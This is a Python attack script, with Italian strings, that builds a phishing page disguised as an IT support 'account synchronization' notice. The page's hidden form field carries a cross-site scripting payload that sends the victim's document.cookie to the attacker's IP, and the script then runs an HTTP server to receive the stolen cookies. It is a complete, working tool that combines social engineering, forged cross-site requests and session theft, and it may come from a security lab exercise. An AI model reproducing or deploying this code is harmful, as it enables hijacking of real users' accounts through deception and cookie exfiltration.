import sys
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer

if len(sys.argv) == 3:
    ip_vittima = sys.argv[1]
    ip_attaccante = sys.argv[2]
else:
    print("Inserire ip della vittima e dell'attaccante come parametri:")
    print("$ python3 sql_injection_login.py <IP_VITTIMA> <IP_ATTACANTE>")
    exit(-1)

html = f"""
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>IT Support - Security Check</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }}
        .container {{
            background-color: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            text-align: center;
            max-width: 400px;
        }}
        .warning-icon {{
            font-size: 50px;
            color: #d9534f;
            margin-bottom: 10px;
        }}
        h2 {{ color: #333; }}
        p {{ color: #666; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }}
        .btn {{
            background-color: #0056b3;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
        }}
        .btn:hover {{ background-color: #004494; }}
    </style>
</head>
<body>

    <div class="container">
        <div class="warning-icon">⚠️</div>
        <h2>Sincronizzazione Account</h2>
        <p>Il sistema ha rilevato un'anomalia con i cookie di sessione del tuo account. Per evitare la disattivazione e ripristinare i permessi, clicca sul pulsante sottostante per forzare un recupero sicuro.</p>

        <form action="http://{ip_vittima}/recovery.php" method="POST">

            <textarea name="mail" style="display:none;"><svg onload="fetch('http://{ip_attaccante}/?cookie=' + btoa(document.cookie))"></svg></textarea>

            <button class="btn" type="submit">Ripristina Sessione Sicura</button>

        </form>
    </div>

</body>
</html>
"""

with open("esca.html", "w", encoding="utf-8") as f:
    f.write(html)

print(f"Pagina {f.name} generato correttaemnte.")
print("Inviare la pagina html alla vittima ed attendere il cookie.")

PORT = 80

with TCPServer((f"{ip_attaccante}", PORT), SimpleHTTPRequestHandler) as httpd:
    print(f"Server attivo su http://localhost:{PORT}")
    httpd.serve_forever()



